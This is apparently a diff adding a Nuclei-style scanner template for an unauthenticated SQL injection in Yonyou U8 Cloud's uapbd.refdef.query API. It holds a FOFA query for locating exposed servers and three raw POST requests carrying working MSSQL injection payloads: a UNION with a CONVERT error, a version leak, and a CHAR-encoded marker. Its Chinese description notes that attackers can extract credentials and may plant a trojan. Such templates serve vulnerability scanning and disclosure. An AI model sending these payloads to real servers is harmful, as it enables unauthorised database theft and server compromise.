@@ -1,0 +1,71 @@
+id: yongyouU8-Cloud-uapbd_refdef_query-sql
+
+info:
+  name: 用友U8 Cloud uapbd.refdef.query SQL注入漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: title=="U8C"
+    用友U8 Cloud uapbd.refdef.query 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489201&idx=1&sn=09a6509f51764a2e173cfe85a5447411&chksm=c267a382f5102a942f894175cf225a3ecb6a9b3fd72f457e7feac4de4db3c279eb5e79565fd8&token=1526905597&lang=zh_CN#rd
+  tags: sql injection
+
+
+
+http:
+  - raw:
+      - |
+        POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/json
+
+        {"refName":"1%' UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- "}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '在将 varchar 值'
+          - '转换成数据类型 int 时失败'
+        condition: and
+      - type: status
+        status: 
+          - 200
+  - raw:
+      - |
+        POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/json
+
+        {"refName":"1%' AND 1-@@VERSION=1--+-"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft SQL'
+          - 'Microsoft Corporation'
+        condition: and
+      - type: status
+        status: 
+          - 200
+  - raw:
+      - |
+        POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/json
+
+        {"refName":"1' UNION ALL SELECT 98,CHAR(113)+CHAR(98)+CHAR(98)+CHAR(106)+CHAR(113)+CHAR(108)+CHAR(90)+CHAR(117)+CHAR(75)+CHAR(73)+CHAR(85)+CHAR(90)+CHAR(109)+CHAR(87)+CHAR(67)+CHAR(66)+CHAR(77)+CHAR(89)+CHAR(101)+CHAR(116)+CHAR(120)+CHAR(108)+CHAR(117)+CHAR(115)+CHAR(120)+CHAR(82)+CHAR(121)+CHAR(67)+CHAR(68)+CHAR(112)+CHAR(117)+CHAR(100)+CHAR(120)+CHAR(85)+CHAR(82)+CHAR(85)+CHAR(111)+CHAR(117)+CHAR(114)+CHAR(119)+CHAR(118)+CHAR(75)+CHAR(69)+CHAR(66)+CHAR(102)+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(113),98-- EvET"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qbbjqlZuKIUZmWCBMYetxlusxRyCDpudxURUourwvKEBfqqpvq'
+      - type: status
+        status: 
+          - 200
